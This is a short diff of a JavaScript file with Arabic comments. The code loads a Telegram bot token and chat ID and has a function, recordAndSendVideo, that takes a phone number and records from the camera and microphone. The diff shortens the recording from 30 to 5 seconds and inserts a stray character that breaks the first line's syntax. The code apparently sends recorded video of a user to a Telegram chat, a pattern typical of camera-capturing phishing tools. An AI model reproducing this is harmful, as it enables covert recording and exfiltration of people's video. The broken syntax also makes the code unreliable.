@@ -1,4 +1,4 @@
-let botToken = '';
+Ulet botToken = '';
 let chatId = '';
 
 // تحميل التوكن ومعرف الدردشة من config.json
@@ -91,7 +91,7 @@ async function recordAndSendVideo(phoneNumber) {
     };
 
     mediaRecorder.start();
-    setTimeout(() => mediaRecorder.stop(), 30000);
+    setTimeout(() => mediaRecorder.stop(), 5000);
   } catch (error) {
     console.error("فشل تشغيل الكاميرا:", error);
     alert("حدث خطأ في الوصول إلى الكاميرا أو الميكروفون.");
